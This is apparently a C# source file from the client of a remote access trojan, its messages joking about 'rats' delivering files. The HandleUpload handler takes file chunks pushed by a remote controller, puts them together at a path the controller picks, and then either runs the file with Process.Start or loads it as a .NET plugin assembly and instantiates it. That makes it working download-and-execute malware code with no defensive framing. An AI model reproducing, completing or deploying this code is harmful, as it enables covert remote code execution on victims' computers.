using Client.Connection;
using Stuff;
using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Text;
using System.Threading;

namespace Client.Handlers
{
    internal class HandleUpload
    {
        public void Init(Unpack unpack)
        {
            try
            {
                if (unpack.GetAsBoolen("isCompleted"))
                {
                    string duid = unpack.GetAsString("DUID");
                    string fileName = unpack.GetAsString("FileName");
                    string filePath = unpack.GetAsString("FilePath");
                    bool isPlugin = unpack.GetAsBoolen("isPlugin");
                    bool execute = unpack.GetAsBoolen("Execute");
                    long fileSize = unpack.GetAsLong("FileSize");
                    long TempCount = unpack.GetAsInteger("TempCount");
                    sfile(duid, fileName, filePath, TempCount, fileSize, isPlugin, execute);
                }
                else
                {
                    string TempName = unpack.GetAsString("TempName");
                    byte[] fileBytes = unpack.GetAsByteArray("FileBytes");
                    if (!string.IsNullOrEmpty(TempName))
                    {
                        tfile(TempName, fileBytes);
                    }
                }
            }
            catch (Exception ex)
            {
                Pack pack = new Pack();
                pack.Set("Packet", "Error");
                pack.Set("Error", ex.Message);
                SillyClient.Send(pack.Pacc());
            }
        }

        public void tfile(string fileName, byte[] fileBytes)
        {
            string filePath = Path.Combine(Path.GetTempPath(), fileName);
            using (FileStream fileStream = new FileStream(filePath, FileMode.OpenOrCreate, FileAccess.ReadWrite))
            {
                fileStream.Write(fileBytes, 0, fileBytes.Length);
            }
        }

        public void sfile(string duid, string fileName, string filePath, long TempCount, long fileLength, bool isPlugin, bool execute)
        {
            if (TempCount > 0)
            {
                Thread.Sleep(3000);
                Pack pack = new Pack();
                pack.Set("Packet", "Upload");
                pack.Set("DUID", duid);
                pack.Set("isOk", true);
                pack.Set("Message", "Our rats are delivering your file!");
                SillyClient.Send(pack.Pacc());

                string finalFilePath = filePath == "TempClient" ? Path.GetTempPath() : filePath;
                using (FileStream fileStream = new FileStream(Path.Combine(finalFilePath, fileName), FileMode.OpenOrCreate, FileAccess.ReadWrite))
                {
                    for (int i = 1; i <= TempCount; i++)
                    {
                        string TempName = Helpers.MD5_STRING(Encoding.UTF8.GetBytes(fileName + duid + i.ToString()));
                        string TempFilePath = Path.Combine(Path.GetTempPath(), TempName);
                        if (!File.Exists(TempFilePath)) continue;
                        byte[] TempFileBytes = File.ReadAllBytes(TempFilePath);
                        fileStream.Write(TempFileBytes, 0, TempFileBytes.Length);
                        File.Delete(TempFilePath);
                    }
                }

                long RfileLength = new FileInfo(Path.Combine(finalFilePath, fileName)).Length;
                if (RfileLength == fileLength)
                {
                    pack = new Pack();
                    pack.Set("Packet", "Upload");
                    pack.Set("DUID", duid);
                    pack.Set("isOk", true);
                    pack.Set("Message", "Our rats have completed the work");
                    SillyClient.Send(pack.Pacc());
                }
                else
                {
                    pack = new Pack();
                    pack.Set("Packet", "Upload");
                    pack.Set("DUID", duid);
                    pack.Set("isOk", false);
                    SillyClient.Send(pack.Pacc());
                }
                if (execute)
                {
                    try
                    {
                        Process.Start(Path.Combine(finalFilePath, fileName));
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine($"{ex.Message}");
                    }
                }

                if (isPlugin)
                {
                    ExecutePlugin(finalFilePath, fileName);
                }
            }
        }

        public void ExecutePlugin(string directory, string fileName)
        {
            try
            {
                string pluginPath = Path.Combine(directory, fileName);
                Assembly pluginAssembly = Assembly.LoadFrom(pluginPath);
                string className = Path.GetFileNameWithoutExtension(fileName) + ".Main";
                Type mainClassType = pluginAssembly.GetType(className);
                if (mainClassType != null)
                {
                    object mainInstance = Activator.CreateInstance(mainClassType);
                }
            }
            catch (Exception ex)
            {
                Pack pack = new Pack();
                pack.Set("Packet", "Error");
                pack.Set("Error", "Failed to execute plugin: " + ex.Message);
                SillyClient.Send(pack.Pacc());
            }
        }

    }
}
